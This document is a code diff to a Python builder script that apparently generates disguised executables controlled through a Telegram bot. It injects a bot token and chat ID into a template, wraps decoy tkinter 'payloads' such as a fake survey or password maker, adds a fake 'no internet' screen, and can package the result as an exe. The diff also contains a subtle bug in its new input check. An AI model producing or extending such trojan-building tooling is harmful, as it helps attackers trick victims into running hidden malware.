@@ -71,7 +71,7 @@ MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
     import os
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + banners[randint(0, 3)])
-def make_python(ID, TOKEN, NAME, CODE_ADDR):
+def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR):
     with open("builder/build.py", "r") as read: 
         text = read.readlines()
         with open(CODE_ADDR, "r") as read:
@@ -81,18 +81,14 @@ def make_python(ID, TOKEN, NAME, CODE_ADDR):
             tkinter_code = """"""
             for i in reader:
                 tkinter_code += f"    {i}\n"
-            offline = """    root = Tk()
-    Label(root, text="Check Your internet connection", font=("", 15)).pack()
-    root.title("Survey")
-    root.geometry("300x300")
-    # picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
-    # root.iconphoto(False, picture) 
-    root.resizable(False, False)
-    root.mainloop()"""
-        if CODE_ADDR == "builder/tk_payloads/none.py":
-            text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace(offline, "    pass")
-        else:
-            text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code)            
+        with open(OFFLINE_CODE_ADDR, "r") as read:
+            reader = read.readlines()
+            reader = "".join(reader)
+            reader = reader.split("\n")
+            offline_tkinter_code = """"""
+            for i in reader:
+                offline_tkinter_code += f"    {i}\n"
+        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
     system("mkdir output")
     with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
@@ -126,7 +122,13 @@ try:
         if code_addr.endswith(".py"): pass
     else: 
         code_addr = "builder/tk_payloads/password_maker.py"
-    make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr)
+    offline_code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
+    if code_addr == "c":
+        offline_code_addr = input("write your code address(.py file): ")
+        if code_addr.endswith(".py"): pass
+    else: 
+        offline_code_addr = "builder/tk_payloads/offline/no_internet.py"
+    make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
         make_exe(NAME=name, ICON=icon)
